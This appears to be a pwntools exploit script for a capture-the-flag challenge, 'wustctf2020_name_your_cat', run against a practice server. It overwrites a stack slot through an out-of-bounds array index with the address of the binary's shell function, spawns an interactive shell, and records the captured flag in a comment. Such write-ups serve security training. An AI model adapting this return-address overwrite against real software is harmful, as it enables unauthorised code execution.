#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port =  28106
elfpath = 'wustctf2020_name_your_cat'
ldpath = ''
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
e = ELF(elfpath)
shell_addr = e.sym['shell']

ru(b'Name for which?\n>')
sl(b'7')
ru(b'Give your name plz: ')
sl(p32(shell_addr))

for i in range(4):
    ru(b'Name for which?\n>')
    sl(b'1')
    ru(b'Give your name plz: ')
    sl(b'a')

shell()

# flag{e339c72d-0a20-461f-a3da-4b820baa7003}

